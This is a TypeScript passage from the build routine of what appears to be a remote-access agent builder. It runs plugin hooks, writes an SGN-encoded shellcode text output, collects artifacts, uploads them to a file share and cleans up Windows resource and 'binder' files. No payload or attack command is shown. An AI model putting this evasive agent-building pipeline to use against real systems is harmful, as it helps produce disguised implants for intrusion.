            await runBuildHooks(
              deps.runBuildHookForAll,
              "after_sgn_txt",
              buildTransformHookPayload({
                buildId,
                stage: "after_sgn_txt",
                platform,
                os,
                arch: actualArch,
                targetKey,
                outDir,
                clientDir,
                filename: finalOutputName,
                filePath: txtOutputPath,
                size: finalOutputSize,
                config,
                extra: { shellcodeArch, iterations: iters },
              }),
              sendToStream,
            );
            sendToStream({ type: "output", text: `SGN TXT ready: ${txtSize} bytes → ${finalOutputName}\n`, level: "success" });
          }
        }

        const extraArtifactFiles: any[] = [];
        const artifactHookPayload = {
          buildId,
          platform,
          os,
          arch: actualArch,
          targetKey,
          outDir,
          clientDir,
          file: {
            name: finalOutputName.replace(`-${buildSlug}`, ""),
            filename: finalOutputName,
            path: path.join(outDir, finalOutputName),
            platform,
            version: agentVersion,
            size: finalOutputSize,
          },
          files: cloneForHook(build.files),
          config,
        };
        for (const item of await runBuildHooks(deps.runBuildHookForAll, "artifact", artifactHookPayload, sendToStream)) {
          if (!isRecord(item.result)) continue;
          const replacement = isRecord(item.result.file) ? item.result.file : item.result;
          if (typeof replacement.filename === "string" && replacement.filename.trim()) {
            const safeFilename = deps.sanitizeOutputName(path.basename(replacement.filename.trim()));
            const candidatePath = resolveContainedPath(outDir, safeFilename);
            if (fs.existsSync(candidatePath)) {
              finalOutputName = safeFilename;
              finalOutputSize = fs.statSync(candidatePath).size;
            } else {
              sendToStream({
                type: "output",
                text: `[plugin:${item.pluginId}] WARNING: artifact hook returned missing file ${safeFilename}; keeping ${finalOutputName}\n`,
                level: "warn",
              });
            }
          }
          if (typeof replacement.size === "number" && Number.isFinite(replacement.size) && replacement.size >= 0) {
            finalOutputSize = Math.floor(replacement.size);
          }
          if (Array.isArray(item.result.files)) {
            for (const f of item.result.files) {
              if (!isRecord(f) || typeof f.filename !== "string" || !f.filename.trim()) continue;
              const safeFilename = deps.sanitizeOutputName(path.basename(f.filename.trim()));
              const candidatePath = resolveContainedPath(outDir, safeFilename);
              if (!fs.existsSync(candidatePath)) {
                sendToStream({
                  type: "output",
                  text: `[plugin:${item.pluginId}] WARNING: extra artifact not found: ${safeFilename}\n`,
                  level: "warn",
                });
                continue;
              }
              const stat = fs.statSync(candidatePath);
              extraArtifactFiles.push({
                name: typeof f.name === "string" && f.name.trim() ? f.name.trim() : safeFilename,
                filename: safeFilename,
                platform: typeof f.platform === "string" ? f.platform : platform,
                version: typeof f.version === "string" ? f.version : agentVersion,
                size: stat.size,
              });
            }
          }
        }

        (build.files as any[]).push({
          name: finalOutputName.replace(`-${buildSlug}`, ""),
          filename: finalOutputName,
          platform,
          version: agentVersion,
          size: finalOutputSize,
        });
        (build.files as any[]).push(...extraArtifactFiles);
      } catch (err: any) {
        const errorMsg = `[ERROR] Failed to build ${platform}: ${err.message || err}\n`;
        logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg.trim()}`);
        sendToStream({ type: "output", text: errorMsg, level: "error" });
        throw err;
      }
    }

    build.status = "completed";
    logger.info(`[build:${buildId.substring(0, 8)}] Build completed successfully! Built ${build.files.length} file(s)`);
    sendToStream({ type: "output", text: `\n[OK] Build completed successfully!\n`, level: "success" });

    if (config.uploadToFileShare && config.builtByUserId && deps.fileShareRoot) {
      try {
        await uploadBuildFilesToFileShare(
          build,
          outDir,
          deps.fileShareRoot,
          config.builtByUserId,
          sendToStream,
        );
      } catch (uploadErr: any) {
        sendToStream({
          type: "output",
          text: `WARNING: File-share upload failed: ${uploadErr.message || uploadErr}\n`,
          level: "warn",
        });
      }
    } else if (config.uploadToFileShare && !deps.fileShareRoot) {
      sendToStream({
        type: "output",
        text: "WARNING: File-share upload requested but file share is not configured on this server.\n",
        level: "warn",
      });
    }

    await runBuildHooks(
      deps.runBuildHookForAll,
      "complete",
      {
        buildId,
        status: build.status,
        files: build.files,
        outputDir: outDir,
        expiresAt: build.expiresAt,
        userId: config.builtByUserId,
        config,
      },
      sendToStream,
    );

    sendToStream({ type: "complete", success: true, files: build.files, buildId, expiresAt: build.expiresAt });

    saveBuild({
      id: build.id,
      status: build.status,
      startTime: build.startTime,
      expiresAt: build.expiresAt,
      files: build.files as any,
      buildTag,
      builtByUserId: config.builtByUserId,
    });

    setTimeout(() => {
      logger.info(`[build:${buildId.substring(0, 8)}] Cleaning up expired build`);
      buildManager.deleteBuildStream(buildId);
    }, SEVEN_DAYS_MS);
  } catch (err: any) {
    build.status = "failed";
    logger.error(`[build:${buildId.substring(0, 8)}] Build failed:`, err);
    try {
      await runBuildHooks(
        deps.runBuildHookForAll,
        "failed",
        {
          buildId,
          status: build.status,
          error: err?.message || String(err),
          files: build.files,
          userId: config.builtByUserId,
          config,
        },
        sendToStream,
      );
    } catch (hookErr) {
      logger.warn(`[build:${buildId.substring(0, 8)}] failed hook error:`, hookErr);
    }
    sendToStream({ type: "error", error: err.message || String(err) });
    sendToStream({ type: "complete", success: false, buildId });

    setTimeout(() => {
      logger.info(`[build:${buildId.substring(0, 8)}] Cleaning up failed build stream`);
      buildManager.deleteBuildStream(buildId);
    }, 60 * 60 * 1000);
  } finally {
    clearInterval(keepAliveTimer);
    for (const sysoFile of generatedSysoFiles) {
      try { fs.unlinkSync(sysoFile); } catch {}
    }
    if (winresTempDir) {
      try { fs.rmSync(winresTempDir, { recursive: true, force: true }); } catch {}
    }
    // Binder cleanup: remove generated Go file, bindfiles dir, and release lock
    if (binderGenPath) {
      try { fs.unlinkSync(binderGenPath); } catch {}
    }
    if (binderFilesDir) {
      try { fs.rmSync(binderFilesDir, { recursive: true, force: true }); } catch {}
    }
    if (binderLockPath) {
      try { fs.unlinkSync(binderLockPath); } catch {}
    }
  }
}
